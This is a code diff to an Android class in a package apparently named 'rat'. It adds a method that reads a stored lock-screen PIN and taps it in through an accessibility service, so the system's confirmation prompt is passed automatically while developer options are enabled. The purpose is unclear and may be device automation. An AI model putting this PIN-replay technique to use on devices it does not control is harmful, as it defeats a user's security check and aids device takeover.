@@ -9,6 +9,7 @@ import com.vendor.rat.auto.condition.CombineFilter;
 import com.vendor.rat.auto.condition.StringCondition;
 import com.vendor.rat.auto.entity.UiNode;
 import com.vendor.rat.config.TextConfig;
+import com.vendor.rat.credential.LockCredentialStore;
 import com.vendor.rat.service.MyAccessibilityService;
 import com.vendor.rat.utils.DeviceUtils;
 
@@ -350,6 +351,90 @@ public class OpenDevelopmentDelegate extends AutoEngine {
         }
     }
 
+    // ============ ConfirmLockPassword 联动 ============
+
+    /**
+     * 处理锁屏确认窗口 — 委托给 ConfirmLockDelegate 自动输入 PIN
+     *
+     * 当开启开发者选项时系统弹出 ConfirmLockPassword:
+     * 1. 无 PIN → 快速失败 (STATE_ENABLE_FAIL)
+     * 2. 有 PIN → 状态迁移到 STATE_ENTER_CONFIRM, 尝试自动输入
+     * 3. 输入成功 → STATE_CONFIRM_SUCCESS, 继续 checkDevModeEnabled 轮询
+  * 4. 输入失败 → STATE_ENABLE_FAIL
+     */
+    public void handleConfirmLockWindow() {
+  String pin = LockCredentialStore.getPin();
+ if (pin == null || pin.isEmpty()) {
+     Log.w(TAG, "ConfirmLockPassword detected but no PIN stored, fast-fail");
+            currentState.set(STATE_ENABLE_FAIL);
+    return;
+        }
+
+        currentState.set(STATE_PREPARE_CONFIRM);
+        Log.d(TAG, "ConfirmLockPassword detected, transitioning to ENTER_CONFIRM");
+        currentState.set(STATE_ENTER_CONFIRM);
+
+        // Try to get root node for auto-input
+        activateRoot();
+        UiNode root = k();
+        if (root == null) {
+       Log.w(TAG, "No root node available for ConfirmLockPassword auto-input");
+            currentState.set(STATE_ENABLE_FAIL);
+return;
+        }
+
+        // Use the same filter logic as ConfirmLockDelegate.findDigitButton
+        boolean allClicked = true;
+      for (int i = 0; i < pin.length(); i++) {
+            char digit = pin.charAt(i);
+            CombineFilter filter = CombineFilter.and(
+                    StringCondition.className("android.widget.Button"),
+         StringCondition.descEquals(String.valueOf(digit)));
+          UiNode digitBtn = root.findOneByCombine(filter);
+         if (digitBtn == null) {
+  Log.w(TAG, "Cannot find button for digit: " + digit);
+          allClicked = false;
+ break;
+            }
+            digitBtn.click();
+            Log.d(TAG, "Clicked digit " + (i + 1) + "/" + pin.length());
+            sleep(100);
+
+  // Refresh root between digits
+        if (i < pin.length() - 1) {
+     activateRoot();
+    UiNode newRoot = k();
+       if (newRoot != null) {
+ root = newRoot;
+      }
+  }
+        }
+
+if (allClicked) {
+ // Wait briefly for ConfirmLockPassword to dismiss
+      T0(5); // 1 second
+            if (!ConfirmLockDelegate.isLockScreen(getCurrentClassName())) {
+      currentState.set(STATE_CONFIRM_SUCCESS);
+        Log.d(TAG, "ConfirmLockPassword dismissed, continuing dev mode flow");
+                return;
+  }
+        }
+
+      Log.w(TAG, "ConfirmLockPassword auto-input failed");
+        currentState.set(STATE_ENABLE_FAIL);
+    }
+
+    /**
+     * Get current window class name from accessibility service.
+     */
+    private String getCurrentClassName() {
+        try {
+      return MyAccessibilityService.getCurrentWindowClass();
+    } catch (Exception e) {
+      return null;
+      }
+    }
+
     // ============ 辅助方法 ============
 
     /**
@@ -526,9 +611,9 @@ public class OpenDevelopmentDelegate extends AutoEngine {
             handleAlertDialog();
         }
         if (STATE_ENTER_CONFIRM.equals(state)) {
-            // vendor case 4: 处理锁屏确认 — 委托给 ConfirmLockDelegate
-            Log.d(TAG, "进入锁屏确认状态");
-        }
+            // vendor case 4: 处理锁屏确认 — 委托自动输入 PIN
+            handleConfirmLockWindow();
+      }
         if (STATE_PREPARE_CONFIRM.equals(state) || STATE_CONFIRM_SUCCESS.equals(state)) {
             // vendor case 5: 确认成功后继续
             Log.d(TAG, "锁屏确认完成/准备中");
